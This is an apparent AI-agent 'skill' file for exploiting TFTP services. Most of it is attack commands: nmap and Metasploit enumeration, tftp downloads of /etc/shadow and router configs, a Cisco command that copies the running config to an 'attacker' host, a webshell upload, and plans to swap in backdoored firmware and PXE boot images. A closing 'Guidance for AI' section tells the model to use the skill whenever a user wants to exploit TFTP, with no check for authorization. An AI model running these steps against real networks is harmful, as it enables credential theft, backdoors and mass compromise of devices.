# TFTP Pentesting Skill

## Goal

Exploit TFTP (Trivial File Transfer Protocol) services to download sensitive files and potentially upload malicious content.

## Methodology

1. **Discovery**: Identify TFTP services
2. **File Enumeration**: Attempt to download common configuration files
3. **Download Sensitive Data**: Retrieve configuration, credentials, or code
4. **Upload Attacks**: Upload malicious files if write access is allowed

## Port

- 69/UDP: TFTP

## Background

TFTP is:
- No authentication
- No directory listing
- Used for network device bootstrapping
- Used for PXE boot (OS installation)
- Used for router configuration backup

## Tools

* **tftp**: TFTP client
* **atftp**: Advanced TFTP client
* **nmap**: TFTP scripts
* **Metasploit**: TFTP modules

## Example Commands

```bash
# Nmap TFTP detection
nmap -sU -p69 --script tftp-* target
nmap -sU -p69 --script tftp-enum target

# Connect and download
tftp target
tftp> get /etc/passwd
tftp> get config.txt
tftp> quit

# Using atftp
atftp -g -r /etc/passwd -l passwd.txt target

# Attempt to upload
tftp target
tftp> put shell.php
tftp> quit
```

## Common Files to Download

```bash
# Network device configurations
tftp target
get running-config
get startup-config
get config
get router.cfg
get switch.cfg

# Cisco specific
get network-config
get running-config
get startup-config
get config.text

# PXE/Boot files
get pxelinux.cfg/default
get boot/grub/grub.cfg
get preseed.cfg
get ks.cfg  # Kickstart

# Linux files (if root exposed)
get /etc/passwd
get /etc/shadow
get /etc/hosts

# Backup files
get backup.tar
get backup.zip
get *.bak
```

## Cisco Device Exploitation

```bash
# If TFTP is used for config backup

# Download running config
# Requires valid config filename

# Common config filenames:
running-config
startup-config
network-config
router-config
config.text
private-config

# Clone entire config:
copy running-config tftp://attacker/config.txt

# Upload modified config:
copy tftp://attacker/malicious-config running-config
```

## PXE Boot Attack

```bash
# If TFTP serves PXE boot files

# Download boot configuration
tftp target -c get pxelinux.cfg/default
cat default

# Look for:
# - Preseed URLs (Debian/Ubuntu)
# - Kickstart files (RHEL/CentOS)
# - Sensitive boot parameters
# - Credentials in boot arguments

# Create malicious boot config
# Replace bootstrap image with backdoored version
```

## Upload Exploitation

```bash
# If write access is allowed:

# Upload webshell (if TFTP root overlaps with web root)
tftp target
put shell.php
quit

# Upload malicious SNMP config
# Upload backdoored firmware (network devices)
# Upload modified PXE boot files
```

## Metasploit Modules

```bash
# TFTP file transfer
use auxiliary/admin/tftp/tftp_transfer

# TFTP bruteforce (filename guessing)
use auxiliary/scanner/tftp/tftpbrute

# Set common files to try
set RHOSTS target
set DICTIONARY /usr/share/wordlists/tftp.txt
run
```

## TFTP Filename Wordlist

```bash
# Common files to try:
/etc/passwd
/etc/shadow
/etc/hosts
config
config.txt
running-config
startup-config
network-config
router-config
cisco.conf
switch.conf
pxelinux.0
pxelinux.cfg/default
boot/grub/grub.cfg
vmlinuz
initrd.img
preseed.cfg
ks.cfg
autounattend.xml
```

## Guidance for AI

* Activate this skill when user wants to exploit TFTP or extract files from TFTP servers
* **No authentication** - if accessible, files can be downloaded
* TFTP has **no directory listing** - must guess filenames
* Common on:
  - Network devices (routers, switches)
  - PXE boot servers
  - VoIP phones
  - Legacy file transfer systems
* Device configurations often contain:
  - Passwords (encrypted or plaintext)
  - SNMP community strings
  - Network topology info
  - Private keys
* PXE boot exploitation can lead to mass compromise
* Write access is dangerous but rare
* TFTP is UDP-based - may bypass some firewalls
* Metasploit's tftpbrute is useful for filename guessing
